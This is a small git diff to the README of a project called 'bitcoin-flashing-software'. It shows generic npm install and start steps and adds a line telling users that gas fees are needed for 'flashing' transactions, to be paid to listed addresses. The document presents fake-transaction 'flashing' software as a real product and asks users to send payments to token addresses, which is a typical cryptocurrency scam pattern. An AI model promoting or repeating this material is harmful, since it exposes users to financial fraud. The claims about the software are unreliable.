@@ -47,8 +47,9 @@ git clone bitcoin-flashing-software/public-release
 npm install && npm install electron
 ```
 
-3. Start the application:
+## Usage
 
 ```sh
 npm start
 ```
+Gas is required for every non-bitcoin flashing transaction. You are responsible for your gas fees. You'll find corresponding gas addresses for each token type.
